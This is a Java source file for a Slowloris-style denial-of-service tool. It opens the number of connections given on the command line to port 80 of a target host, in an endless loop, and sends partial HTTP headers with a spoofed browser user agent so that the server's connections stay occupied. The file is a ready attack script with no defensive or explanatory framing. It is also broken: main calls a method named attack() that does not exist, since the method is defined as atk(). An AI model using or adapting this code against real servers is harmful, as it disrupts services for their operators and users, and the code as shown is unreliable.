import java.net.*;
import java.io.*;
import java.util.Random;
public class Slowloris {
	String adrs;
	int conctns;

public Slowloris(String adrs,int conctns){
	this.adrs = adrs;
	this.conctns = conctns;
	}

public void atk(){
	while(true){
		try{
			for(int i = 0 ; i<this.conctns; i++){
				Random r = new Random();
				String rand = "?" + String.valueOf(r.nextInt(987654321));
				String head = "GET /"+rand+" HTTP/1.1\r\n" + "Host: "+this.adrs+"\r\n" + "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" + "Content-Length: 42\r\n";
          			OutputStream what_serv = new Socket(this.adrs,80).getOutputStream();
          			PrintWriter out = new PrintWriter(what_serv);
          			out.print(head);
				out.flush();
				out.print("X-a: b\r\n");
				out.flush();
        	}
        }
        	catch (Exception ex){
        		System.out.println(ex);
        }
	}
}

public static void main(String args[]){
	String adrs = args[0];
      	int c = Integer.parseInt(args[1]);
	Slowloris s_loris = new Slowloris(adrs,c);
	s_loris.attack();
	}
}